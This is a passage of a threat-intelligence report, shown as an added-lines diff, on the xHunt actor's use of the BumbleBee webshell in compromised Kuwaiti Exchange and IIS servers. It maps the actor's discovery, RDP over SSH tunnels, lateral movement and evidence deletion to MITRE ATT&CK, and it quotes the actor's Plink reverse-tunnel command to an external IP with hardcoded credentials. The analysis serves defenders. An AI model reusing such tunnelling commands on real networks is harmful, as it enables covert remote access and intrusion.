@@ -1,0 +1,65 @@
+Commands Executed via BumbleBee
+As we previously mentioned, the compromised Exchange server of a Kuwaiti organization does not
+log the POST data within the IIS logs, so we were unable to extract the commands run on the
+BumbleBee webshell. However, we used overlapping timestamps to correlate the activity in the IIS
+logs with the command prompt activity seen in Cortex XDR logs to determine the commands
+executed on the server. Unfortunately, we did not have visibility into the commands executed on
+BumbleBee until Sept. 16, 2020, when Cortex XDR was installed on the compromised Exchange
+server in response to the suspicious activity. We were also able to determine the commands run on
+the BumbleBee webshell hosted on the internal IIS web server at one of the two other Kuwaiti
+organizations as well.
+Based on the Cortex XDR logs, the actor spent three hours and 37 minutes on Sept. 16, 2020,
+running commands via the BumbleBee webshell installed on the compromised Exchange server.
+Table 2 in the Appendix shows all the commands and the MITRE ATT&CK technique identifiers that
+best describe the activities carried out. The commands show the actor:
+1. Performing network discovery (T1018) using ping and net group commands, as well as
+PowerShell (T1059.001), to find additional computers on the network.
+2. Performing account discovery (T1087) using the whoami and quser commands.
+3. Determining the system time (T1124) using the W32tm and time commands.
+4. Creating an SSH tunnel (T1572) using Plink (RTQ.exe) to a remote host.
+5. Using RDP (T1021.001) over the SSH tunnel to control the compromised computer.
+6. Laterally moving (T1570) to another system by mounting a shared folder, copying Plink
+(RTQ.exe) to a remote system and using Windows Management Instrumentation (WMI)
+(T1047) to create an SSH tunnel for RDP access.
+7. Removing evidence of their presence by deleting (T1070.004) BumbleBee after they were done
+issuing commands.
+The commands listed in Table 2 in the Appendix also show the actor using Plink (RTQ.exe) to create
+an SSH tunnel to an external IP address 192.119.110[.]194, as seen in the following command:
+echo y | c:\windows\temp\RTQ.exe 192.119.110[.]194 -C -R 0.0.0.0:8081::3389 -l
+bor -pw 123321 -P 443
+The IP address overlaps with other related infrastructure that we will discuss in a later section of this
+blog. Most importantly, the username and password of bor and 123321 used to create the SSH
+tunnel overlaps directly with prior xHunt activity. These exact credentials were listed within the
+5/18
+cheat sheet found within the Sakabota tool, which provided an example command that the actor
+could use to create SSH tunnels using Plink. We believe the actor used the example command from
+the cheat sheet as a basis for the commands they used to create the SSH tunnels via BumbleBee.
+The actor creates these SSH tunnels to connect to non-internet accessible RDP services on the
+Windows system, specifically to use RDP to interact with the compromised system and to use
+Graphical User Interface (GUI) applications. The actor also uses these SSH tunnels to move laterally
+to other systems on the network, specifically to access internal systems that are not remotely
+accessible from the internet, as depicted in Figure 2.
+Figure 2. Visualization of xHunt actor accessing an internal system from an SSH tunnel created on the internet
+accessible server hosting BumbleBee.
+In addition to analyzing commands executed on the compromised Exchange server, we also
+analyzed the commands executed on the BumbleBee webshell at an internal IIS web server hosted at
+one of the two other Kuwaiti organizations. On Sept. 10, 2020, we found that the actor ran several
+commands to perform network and user account discovery. Additionally, the actor used BumbleBee
+to upload a second webshell with a filename of cq.aspx. The actor used this second webshell to run a
+PowerShell script that issued SQL queries to a Microsoft SQL Server database.
+The actor first issued a SQL query to check the version of SQL server, followed by the actor issuing
+two additional queries that were very specific to the web application running on the IIS web server.
+The PowerShell script used to issue the SQL queries is very similar to scripts that were included in a
+Microsoft Technet forum post titled Running SQL via PowerShell, which suggests the actor may
+have used this forum post as a basis for the PowerShell script. We were unable to obtain the second
+webshell, as the actor deleted it via the BumbleBee webshell when they were finished. Table 3 in the
+Appendix shows the commands executed via BumbleBee on Sept. 10, 2020.
+The logs on the IIS web server hosting the BumbleBee webshell used to issue the commands in Table
+3 only included internal IP addresses for the source of the activity. The internal IP addresses
+suggested this web server was not publicly accessible and did not expose the actor’s source IP
+address. However, all of the attempts to access BumbleBee and run the commands in Table 3 had
+192.119.110[.]194:8083 as the host in the URL of the referrer field within the web server logs. This
+external IP address in the referrer field suggests that the actor was accessing BumbleBee via an SSH
+tunnel. The IP address in the referrer field is also the same as in the command issued to create the
+SSH tunnels for RDP access that we observed on the compromised Exchange server, as shown in
+Table 2.
